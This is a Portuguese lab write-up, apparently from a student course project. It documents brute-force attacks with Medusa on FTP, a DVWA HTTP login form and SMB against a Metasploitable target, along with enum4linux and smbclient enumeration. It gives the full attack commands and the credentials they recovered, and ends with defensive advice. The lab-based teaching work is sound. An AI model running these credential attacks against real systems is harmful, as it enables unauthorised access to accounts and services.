# Kali-Linux
Projeto inspirado nos conhecimentos adquiridos pela plataforma DIO.

O Medusa é uma ferramenta de brute force paralela utilizada para auditoria de autenticação em diversos serviços de rede. Ele permite realizar testes de credenciais em protocolos como:

FTP
SSH
SMB
HTTP
MySQL
Telnet
RDP
Entre outros

Neste laboratório foi utilizado o Kali Linux em conjunto com o ambiente vulnerável Metasploitable/DVWA para fins exclusivamente educacionais e de testes autorizados.

Estrutura do Laboratório

Máquina atacante: Kali Linux
Máquina alvo IP: 192.168.56.101
Serviços testados: FTP, HTTP (DVWA), SMB

Criando listas de usuários e senhas
Lista de usuários: echo -e "user\nadmin\nmsfadmin\nroot" > users.txt
Lista de senhas: echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
Ataque Brute Force em FTP
Comando utilizado
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6

Explicação dos parâmetros:
Parâmetro	Descrição
-h	Host alvo
-U	Lista de usuários
-P	Lista de senhas
-M ftp	Módulo FTP
-t 6	Número de threads

Resultado Obtido:

O Medusa encontrou credenciais válidas para o serviço FTP:

ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin
Ataque Brute Force em HTTP (DVWA)

Foi realizado um teste no formulário de login da aplicação DVWA.

Comando utilizado
medusa -h 192.168.56.101 \
-U users.txt \
-P pass.txt \
-M http \
-m PAGE:'/dvwa/login.php' \
-m FORM:'username=^USER^&password=^PASS^&Login=Login' \
-m FAIL='Login failed'
Resultado Obtido

Foram encontradas diversas combinações válidas:

User: admin Password: 123456
User: user Password: qwerty
User: admin Password: password
User: root Password: 123456
Enumeração SMB com enum4linux

Antes do ataque SMB foi utilizada a ferramenta enum4linux para coleta de informações.

Comando: enum4linux 192.168.56.101
Informações coletadas:
Nome do Workgroup: WORKGROUP
Serviço Samba ativo
Compartilhamentos SMB disponíveis
Ataque Brute Force SMB
Comando utilizado: medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50

Resultado Obtido:

Credencial válida encontrada:

ACCOUNT FOUND: [smbnt] Host: 192.168.56.101 User: msfadmin Password: msfadmin
Enumeração de Compartilhamentos SMB

Após obter acesso, foi utilizado o smbclient para listar os compartilhamentos:

Comando
smbclient -L //192.168.56.101 -U msfadmin
Compartilhamentos encontrados
print$
tmp
opt
IPC$
ADMIN$
msfadmin


O uso de senhas fracas ou padrões facilita ataques de força bruta. Algumas recomendações importantes:

Utilizar senhas fortes
Implementar MFA
Limitar tentativas de login
Monitorar logs de autenticação
Desabilitar serviços desnecessários

Ferramentas Utilizadas: Kali Linux, Medusa, enum4linux, smbclient, DVWA, Metasploitable
